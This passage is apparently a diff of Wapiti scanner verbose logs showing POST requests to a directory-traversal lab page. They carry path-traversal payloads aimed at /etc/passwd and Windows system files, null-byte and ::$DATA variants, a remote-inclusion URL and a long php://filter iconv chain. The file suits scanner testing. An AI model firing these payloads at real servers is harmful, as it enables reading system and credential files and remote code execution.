+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:09.207 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=file%3A%2F%2F%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:55:09.218 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&security_level=2
+2024-03-20 16:55:09.230 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:55:09.242 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:55:09.254 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:09.266 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:09.278 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:55:09.290 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:55:09.302 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=directory_traversal_1.php&security_level=2
+2024-03-20 16:55:09.314 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=directory_traversal_1.php%00&security_level=2
+2024-03-20 16:55:09.326 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=directory_traversal_1.php%3A%3A%24DATA&security_level=2
+2024-03-20 16:55:09.344 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php
+2024-03-20 16:55:09.357 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00
+2024-03-20 16:55:09.365 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=%2Fetc%2Fpasswd
+2024-03-20 16:55:09.373 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=%2Fetc%2Fpasswd%00
+2024-03-20 16:55:09.381 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=%2Fetc%2Fservices
+2024-03-20 16:55:09.390 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=%2Fetc%2Fservices%00
+2024-03-20 16:55:09.398 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 16:55:09.405 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00
+2024-03-20 16:55:09.414 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA
+2024-03-20 16:55:09.421 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:09.430 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:09.437 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA
+2024-03-20 16:55:09.445 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F
+2024-03-20 16:55:09.453 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F
+2024-03-20 16:55:09.461 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:55:09.469 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:55:09.477 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:55:09.485 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:55:09.494 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:55:09.503 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:55:09.511 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:55:09.521 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:55:09.530 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:09.538 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:09.548 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:09.556 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:09.566 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp
+2024-03-20 16:55:09.577 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:55:09.585 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:55:09.594 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:55:09.603 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:55:09.611 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:55:09.618 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:55:09.625 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:55:09.633 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:55:09.640 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:09.647 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:09.654 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:09.662 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:09.669 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:55:09.676 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:55:09.683 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:55:09.691 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:55:09.698 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:55:09.706 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:55:09.713 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:55:09.719 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:55:09.726 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:09.732 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:09.738 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:09.745 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:09.750 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=file%3A%2F%2F%2Fetc%2Fpasswd
+2024-03-20 16:55:09.757 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 16:55:09.763 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
+2024-03-20 16:55:09.769 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00
+2024-03-20 16:55:09.776 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices
+2024-03-20 16:55:09.781 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00
+2024-03-20 16:55:09.788 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:09.795 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:09.800 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=directory_traversal_1.php
+2024-03-20 16:55:09.807 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=directory_traversal_1.php%00
+2024-03-20 16:55:09.813 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=directory_traversal_1.php%3A%3A%24DATA
